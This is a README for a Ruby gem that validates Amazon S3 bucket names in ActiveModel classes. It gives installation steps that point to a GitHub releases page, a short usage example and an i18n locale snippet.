# 🎉 activerecord-s3-bucket-name-validator - Validate S3 Bucket Names Easily

[![Download](https://img.shields.io/badge/Download-v1.0-blue.svg)](https://github.com/mateolo12/activerecord-s3-bucket-name-validator/releases)

## 📦 Overview

The `activerecord-s3-bucket-name-validator` is a simple ActiveModel validator that checks Amazon S3 bucket names. It supports various formats including general names, directory structures, and S3 Tables. This tool helps ensure that you use valid names for your S3 buckets with support for internationalization (i18n). 

## 🚀 Getting Started

### Requirements

To use the `activerecord-s3-bucket-name-validator`, you need:

- A computer with Ruby installed (version 2.5 or higher)
- A Ruby on Rails application, or at least the ActiveModel component available
- Basic understanding of how to install and manage Ruby gems

### Download & Install

Visit this page to download: [Releases Page](https://github.com/mateolo12/activerecord-s3-bucket-name-validator/releases)

Here you will find the most recent version.  

### Installation Steps

1. Go to the [Releases Page](https://github.com/mateolo12/activerecord-s3-bucket-name-validator/releases).
2. Click on the latest version available for download.
3. Download the .gem file to your computer.
4. Open your terminal or command prompt.
5. Navigate to the directory where you downloaded the .gem file. 
6. Run the following command to install the gem:

   ```bash
   gem install activerecord-s3-bucket-name-validator-<version>.gem
   ```

   Replace `<version>` with the version number you downloaded.

7. After the installation is complete, open your Ruby on Rails application.

8. Add the validator to your Gemfile as follows:

   ```ruby
   gem 'activerecord-s3-bucket-name-validator'
   ```

9. Save the Gemfile and run:

   ```bash
   bundle install
   ```

## 🛠️ Usage

After installation, you can use the validator in your ActiveModel classes. Below is an example of how to implement the validator:

```ruby
class YourModel < ApplicationRecord
  validates :bucket_name, s3_bucket_name: true
end
```

In the example above, replace `bucket_name` with the attribute you wish to validate. The validator will automatically check if the name meets the S3 bucket naming rules.

## 🌍 Internationalization (i18n) Support

The validator supports multiple languages using Rails’ i18n functionality. You can modify the error messages to fit your desired languages. Add translations in the appropriate locale files:

```yaml
en:
  activerecord:
    errors:
      models:
        your_model:
          attributes:
            bucket_name:
              invalid: "The bucket name is not valid."
```

Replace `your_model` with the name of your model class.

## 🚧 Common Issues

- **Ruby Version:** Make sure you are using Ruby version 2.5 or above.
- **Bundler Issues:** If you encounter issues during the installation with Bundler, ensure that your Bundler is updated to the latest version by running:

   ```bash
   gem install bundler
   ```

- **Validation Errors:** If the bucket name fails validation, refer to Amazon's bucket naming conventions to ensure your name complies with their standards.

## 📞 Support

If you face issues while using the `activerecord-s3-bucket-name-validator`, you can create an issue on the GitHub repository. Provide details on the error or concern to assist in troubleshooting.

## 🔗 Additional Resources

- [Amazon S3 Bucket Naming Rules](https://docs.aws.amazon.com/AmazonS3/latest/userguide/bucketnamingrules.html)
- [ActiveModel Documentation](https://guides.rubyonrails.org/active_model_basics.html)
- [Ruby on Rails Guides](https://guides.rubyonrails.org/)

## 🎁 License

The code for `activerecord-s3-bucket-name-validator` is open-source and available under the MIT License.

Thank you for using `activerecord-s3-bucket-name-validator`. It helps ensure your S3 bucket names are valid and compliant with AWS standards.